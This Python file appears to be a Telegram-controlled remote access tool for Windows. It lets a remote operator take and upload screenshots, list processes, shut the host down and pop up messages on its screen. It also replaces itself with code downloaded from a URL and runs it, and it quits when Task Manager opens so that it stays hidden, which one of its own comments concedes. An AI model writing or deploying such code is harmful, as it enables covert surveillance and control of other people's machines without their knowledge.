import urllib3 
import regex
import subprocess
import logging
import sys
import subprocess
import pkg_resources
import psutil
import datetime
from messages import TelegramBot
import os
from tkinter import messagebox
import pyautogui
from subprocess import call
from telegram import ForceReply, Update
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters
from elevate import elevate
from win32com.shell import shell
import multiprocessing
from multiprocessing import Process
import time



file=sys.argv[0] 
#Token for the telegram bot.
token="your token here in string format"
#url for online update source
url="your github version of this code here, or wherever your storing your code. Just make sure it's in raw format"
#delay value(int) for process scanner
delay="any delay value that will not crash the system"



#version 
__version__=1.09




#scanner class for scanning and keeping track of currently running programs.
class process_scanner:
    

    def __init__(self,_obj_name,_hidev=False) -> True:
        self._obj_name=_obj_name
        self._hidev=_hidev

    def start_scan(self,_interval):
        self._interval=_interval

        while self._hidev==False:
            import time
            time.sleep(self._interval)
            import subprocess
            processes=subprocess.check_output("tasklist")
            if "Taskmgr.exe" in str(processes):

                self._hidev=True

        if self._hidev==True:
            return False
        
    def scan_stop(self):
        self._hidev=False

    def show_hide_value(self):
        return self._hidev,__name__
 

#Logger class for logging events. Events have 3 severity:info, warning and critical
#info: call with this to record events that are part of the normal functioning of the program
#warning: call with this severity to record events that are crucial but will not break the funtioning of the program.
#critical: call with this severity to record events that are critical to the functioning of the program.

class logger:


    def __init__(self,_log_file,_global_severity=0 ,_logobj= str):
        self._logobj=_logobj
        self._global_severity=_global_severity
        self._log_file=_log_file
    

    def info(self,_function_name,_message):

        log_file=open(self._log_file,"a+")
        log_file.write("\n"+time.ctime()+" at "+str(time.perf_counter_ns())+"    "+_function_name+"   called (local_severity=INFO)with message:  "+_message)
        log_file.close()


    def warning(self,_function_name,_message):

        log_file=open(self._log_file,"a+")
        log_file.write("\n"+time.ctime()+" at "+str(time.perf_counter_ns())+"    "+_function_name+"   called (local_severity=WARNING)with message:  "+_message)
        log_file.close()

    def critical(self,_function_name,_message):

        log_file=open(self._log_file,"a+")
        log_file.write("\n"+time.ctime()+" at "+str(time.perf_counter_ns())+"    "+_function_name+"   called (local_severity=CRITICAL)with message:  "+_message)
        log_file.close()
 
#call this method to produce the log file
    def producelog(self):
        log_file=open(self._log_file,"r")
        msg=log_file.readlines()
        log_file.close()
        return msg
    
#call this method to find the privilege level of the current logging instance.
    def privilege(self):
        if self._global_severity==0:
            print("This logger is at the highest privilege level")
        else:
            return self._global_severity
        
#call this method to identify the logging instance, if there are several instances initiated.
    def identify(self):
        print(self._logobj)




    




logins=logger("logfile.txt",0,"globallogger")


#installs crucial modules by calling pip. Note: programmatic use of pip is strictly not allowed.
try:
    required={"python-telegram-bot","psutil","datetime","messages","urllib3","regex","psutil","datetime","pyautogui","elevate"}
    installed={pkg.key for pkg in pkg_resources.working_set}
    missing=required-installed
    if missing:
        subprocess.check_call([sys.executable,"-m","pip","install",*missing])
    logins.info("PACKAGE INSTALLER","PACKAGES INSTALLED")

except:
    logins.critical("PACKAGE INSTALLER","PACKAGES NOT INITIALIZED")
    logins.critical("PACKAGE INSTALLER","THE FOLLOWING PACKAGES WERE NOT INSTALLED:   "+str(missing))
    




#initiate connection object.
try:

    connection_pool=urllib3.PoolManager()
    resp=connection_pool.request("GET",url)
    match_regex=regex.search(r'__version__*= *(\S+)', resp.data.decode("utf-8"))
    logins.info("CONNECTION OBJECT","CONNECTION OBJECT INITIALIZED")
except:
    logins.critical("CONNECTION OBJECT","CONNECTION OBJECT NOT INITIALIZED")







match_regexno=float(match_regex.group(1))

#version matching is done here
if match_regexno>__version__:

    try:

    
        #new version available. update immediately
        logins.info("REGEX VERSION MATCH","NEW VERSION FOUND")
        origin_file=open(file,"wb")
        origin_file.write(resp.data)
        origin_file.close()
        logins.info("REGEX VERSION MATCH","SUCCESFUL")
        subprocess.call(file,shell=True)
        

    except:
        logins.critical("REGEX VERSION MATCH","UNSUCCESFUL")
elif match_regexno<__version__:
    try:

        #version rollback initiated. updating to old version
        logins.info("REGEX VERSION MATCH","NEW VERSION FOUND")
        origin_file=open(file,"wb")
        origin_file.write(resp.data)
        origin_file.close()
        logins.info("REGEX VERSION MATCH","VERSION ROLLBACK INITIATED")
        subprocess.call(file,shell=True)
    except:
        logins.critical("REGEX VERSION MATCH","UNSUCCESFUL")
else:
    #no new version found. 
    #update not called.
    logins.info("REGEX VERSION MATCH","NO NEW VERSION FOUND")

    
   


    
    #telegram module version matching.

    from telegram import __version__ as TG_VER

    try:
        from telegram import __version_info__
    except ImportError:
        __version_info__ = (0, 0, 0, 0, 0)  # type: ignore[assignment]
        logins.critical("PTB VERSION MATCH","VERSION NOT FOUND")

    if __version_info__ < (20, 0, 0, "alpha", 1):
        logins.critical("PTB VERSION MATCH","INCOMPATIBLE VERSIONS FOUND")
        raise RuntimeError(
            f"This example is not compatible with your current PTB version {TG_VER}. To view the "
            f"{TG_VER} version of this example, "
            f"visit https://docs.python-telegram-bot.org/en/v{TG_VER}/examples.html"
            
        )







        

    # Enable logging
    logging.basicConfig(
        format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
    )
    logger = logging.getLogger(__name__)


    # Define a few command handlers. These usually take the two arguments update and
    # context.

    #Function definition start. Call /start in the chat with the bot to start the bot.
    async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Send a message when the command /start is issued."""
        try:
            user = update.effective_user
            await update.message.reply_html(
                rf"Hi {user.mention_html()}!",
                reply_markup=ForceReply(selective=True),
            )
            logins.info("FUNC START","START INITIATED")
        except:
            logins.warning("FUNC START","FUNCTION NON RESPONSIVE")

    #Function definition of help command. Call the help command to see the available function calls to the bot.





    async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Send a message when the command /help is issued."""
        try:
            await update.message.reply_text("Help!")
            logins.info("FUNC HELP","HELP INITIATED")
        except:
            logins.warning("FUNC HELP","FUNCTION NON RESPONSIVE")

    #Tertiary function defintions
   
   
   
   
   
    #Function definition getupdate. Call /getupdate in the chat with the bot to get a list of all proccesses running in the host system during the time of the function call.
    async def getupdate(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        try:
            btime=psutil.boot_time()
            ftime=datetime.datetime.fromtimestamp(btime).strftime("%Y-%m-%d %H:%M:%S")
            processdict=[ftime,"\n\n"]
            for process in psutil.process_iter():
                processdict+=[process.name(),]
            await update.message.reply_text(processdict)

            logins.info("FUNC GETUPDATE","GETUPDATE INITIATED")
        except:
            logins.warning("FUNC GETUPDATE","FUNCTION NON RESPONSIVE")


    
    
    
    #Function definition shutdown. Call /shutdown to shutdown the host system. Caution: This will stop the script and service to the bot will be terminated.
    async def shutdown(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        try:

            os.system('shutdown -s -t 0')
            logins.info("FUNC SHUTDOWN","SHUTDOWN INITIATED")
        except:
            logins.warning("FUNC SHUTDOWN","FUNCTION NON RESPONSIVE")




    #Function definition of Cpu time. Call /cpu_time to get the percentage of CPU used at the time the function is called.
    async def cpu_time(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        try:

            await update.message.reply_text(psutil.cpu_percent())
            logins.info("FUNC CPU_TIME","CPU_TIME INITIATED")
        except:
            logins.warning("FUNC CPU_TIME","FUNCTION NON RESPONSIVE")




    #Function definition of message. This is not a command. Any message typed to the bot that is not a command gets displayed to the host system's screen(if there is one present)
    #bit of a spooky function if the host system's owner does not know about the program running in the background.
    async def show_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        try:
            _message=update.message.text
            messagebox.showinfo("Messenger from Alexandria",_message)
            
            #toaster=ToastNotifier()                  deprecated
            #toaster.show_toast("Windows",_message)  
            logins.info("FUNC SHOW_MESSAGE","SHOW_MESSAGE INTIATED")
        except:
            logins.warning("FUNC SHOW_MESSAGE","FUNCTION NON RESPONSIVE")

   
   
   
   
   
   
    #Function definition of screenshot method. Call /sc to grab a new screenshot of the host system's screen. However this is still in development and the screenshot may not be of the 
    #resolution of the host system's screen.
    async def image_grab(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
            
        try:
            img_grab=pyautogui.screenshot()
            img_grab.save("image1.png")
            await update.message._bot.sendDocument(update.message.chat_id,open("image1.png","rb"))
            print("sent")
            logins.info("FUNC IMAGE_GRAB","IMAGE_GRAB INITIATED")
        except:
            logins.warning("FUNC IMAGE_GRAB","FUNCTION NON RESPONSIVE")





    #Function definition log file access method. Call /getlogfile to get a text log file of all events logged by the program.
    async def get_log_file(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        try:
            if not open("logfile.txt","r"):
                logins.warning("LOGFILE ACCESS","COULD NOT OPEN FILE")
            await update.message._bot.sendDocument(update.message.chat_id,open("logfile.txt","rb"))
            print("sent")
            logins.info("LOGFILE ACCESS","FILE SENT ")
        except:
            logins.warning("LOGFILE ACCESS","UNSUCCESSFUL")





    #Function definition of clear log file method. Call /clearlogfile to clear the log file of all it's contents.
    #Caution: Calling this will delete all the previous events recorded by the program.
    async def clear_log_file(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        try:
            open('logfile.txt','w').close()
            logins.info("LOGFILE ACCESS","LOGFILE CLEARED")
        except:
            logins.warning("LOGFILE ACCESS","LOGFILE COULD NOT BE CLEARED")
            





    #global variable hide, is True if a restricted app is opened by host system.
    ret={'main_hidev': False}
    #function to start scanner subprocess
    def start_subprocess(queue):
        try:
            ret=queue.get()
            logins.info("PROCESS SCANNER","PROCESS SCAN STARTED WITH DELAY "+str(delay) )
            apr=process_scanner("scA")
            apr.start_scan(delay)
            logins.info("PROCESS SCANNER","RESTRICTED APP CALLED, CLOSING MAIN")
            
            ret['main_hidev']=True
            queue.put(ret)
        
        except:
            logins.critical("PROCESS SCANNER","PROCESS SCAN FAILED")





    
    #Main




    def main() -> None:
        """Start the bot."""
        # Create the Application and pass it the bot's token.
        application = Application.builder().token(token).build()
        logins.info("MAIN","APPLICATION SUCCESSFULLY BUILT")
        # on different commands - answer in Telegram
        application.add_handler(CommandHandler("start", start))  #type /start
        application.add_handler(CommandHandler("help", help_command)) #type /help
        application.add_handler(CommandHandler("shutdown",shutdown)) #type /shutdown
        application.add_handler(CommandHandler("cpu",cpu_time)) #type /cpu
        application.add_handler(CommandHandler("getupdate",getupdate)) #type /getupdate
        application.add_handler(CommandHandler("sc",image_grab)) #type /sc
        application.add_handler(CommandHandler("getlogfile",get_log_file))
        application.add_handler(CommandHandler("clearlogfile",clear_log_file))
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, show_message))


        # Run the bot until the user presses Ctrl-C
        try:

            #Sends a info message informing the user that the host has started the system.
            btime=datetime.datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")
            messageobj=TelegramBot(auth=token,chat_id='820919205',body='The service was started at'+' '+btime)
            messageobj.send()
            logins.info("MAIN","COMMAND LINE INITIATED")
        except:
            logins.critical("MAIN","UNKNOW ERROR")       
        try:

            application.run_polling()
            logins.info("MAIN","APPLICATION POLLING")
        except:
            logins.critical("MAIN","ERROR OCCURED WHILE ATTEMPTING TO POLL APPLICATION")






    #fallback method if thread termination fails to work.
    def end_main_process():
        sys.exit()
#MAIN CALLED HERE

    if __name__ == "__main__":
        try:
            queue=multiprocessing.Queue()
            queue.put(ret)
            #Scanner thread created here
            p=Process(target=start_subprocess,args=(queue,))
            try:

                p.start()
                logins.info("PROCESS SCANNER","THREAD CREATED")
            except:
                logins.critical("PROCESS SCANNER","THREAD CREATION FAILED")
            try:
                #main function thread created here.
                pmain=Process(target=main)
                pmain.start()
                logins.info("MAIN","THREAD CREATED")

            except:
                logins.critical("MAIN","THREAD CREATION FAILED")


            #scanner must wait untill either it is terminated by the program itself, or a restricted app is called by the host system.
            p.join()

            #if global hide value becomes true, end all process threads immediately.
            if queue.get()['main_hidev']==True:
                end_main_process()
        
        except:
            logins.critical("MAIN","ERROR OCCURED WHILE INITIATING MAIN")











